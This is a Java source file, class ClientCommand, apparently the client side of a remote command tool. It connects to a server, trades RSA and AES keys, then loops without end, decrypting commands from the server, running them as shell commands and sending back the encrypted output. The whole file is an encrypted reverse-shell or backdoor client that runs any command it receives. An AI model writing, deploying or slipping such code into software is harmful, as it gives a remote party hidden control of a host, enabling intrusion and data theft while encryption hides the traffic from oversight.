package com.clientapp.service.implement;

import com.clientapp.ClientSocket;
import com.clientapp.service.IClientCommand;
import javax.crypto.SecretKey;
import java.io.*;
import java.net.Socket;
import java.security.*;


import static com.clientapp.util.implement.EncodeDecoder.*;
import static com.clientapp.util.implement.ShellCommandExecutor.executeShellCommand;

public class ClientCommand implements IClientCommand {

    public ClientCommand() {
    }

    @Override
    public void start() {
        try (
                BufferedReader reader = new BufferedReader(new InputStreamReader(ClientSocket.getInstance().getClientSocket().getInputStream()));
                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(ClientSocket.getInstance().getClientSocket().getOutputStream()));
                ) {

            System.out.println("Connected Successfully");

            // Receive RSA public key from the server
            String rsaPublicKeyString = reader.readLine();
            System.out.println("Received RSA Public Key: " + rsaPublicKeyString);
            PublicKey rsaPublicKey = getPublicKeyFromString(rsaPublicKeyString);

            // Generate AES key and encrypt it using RSA public key
            SecretKey aesKey = generateAESKey();
            String encryptedAesKey = encryptAESKey(aesKey, rsaPublicKey);
            System.out.println("AES key: " + encryptedAesKey);
            writer.write(encryptedAesKey + "\n");
            writer.flush();

            // Receive commands from the server, execute shell commands, and send back results
            System.out.println("Waiting for command...");
            while (true) {
                String encryptedCommand = reader.readLine();
                if (encryptedCommand != null && !encryptedCommand.isEmpty()) {
                    String command = decryptCommand(encryptedCommand, aesKey);
                    if (!command.isEmpty()) {
                        String result = executeShellCommand(command);
                        String encryptedResponse = encryptResponse(result, aesKey);
                        writer.write(encryptedResponse + "\n");
                        writer.flush();
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
